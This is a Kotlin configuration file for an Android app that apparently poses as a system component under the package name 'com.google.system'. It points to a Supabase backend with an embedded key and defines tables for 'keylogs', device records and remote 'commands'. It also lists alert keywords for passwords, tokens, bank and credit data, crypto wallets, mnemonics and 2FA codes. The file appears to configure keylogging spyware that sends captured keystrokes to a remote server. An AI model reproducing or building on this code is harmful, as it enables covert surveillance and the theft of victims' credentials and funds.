package com.google.system

/**
 * Supabase project configuration.
 *
 * Replace SUPABASE_URL and SUPABASE_ANON_KEY with your actual values
 * from the Supabase dashboard: Project Settings → API
 *
 * For security:
 *   - In production, use BuildConfig fields set via build.gradle
 *   - The anon key is safe for client-side use (RLS protects the data)
 *   - NEVER embed the service_role key in the app
 */
object SupabaseConfig {
    const val SUPABASE_URL = "https://wbeynuyfzcbtxxqfhwbj.supabase.co"
    const val SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndiZXludXlmemNidHh4cWZod2JqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg3NTExMjcsImV4cCI6MjA5NDMyNzEyN30.K62uEz2vG7ywjZ01O8Dor-mMKK4c8iTWEWB4GAgcLi0"

    const val TABLE_DEVICES = "devices"
    const val TABLE_KEYLOGS = "keylogs"
    const val TABLE_COMMANDS = "commands"

    val KEYWORD_ALERTS = listOf(
        "password", "login", "token", "secret", "apikey",
        "credential", "admin", "root", "ssn", "credit",
        "discord", "whatsapp", "telegram", "bank", "crypto",
        "wallet", "mnemonic", "private key", "2fa", "otp"
    )
}
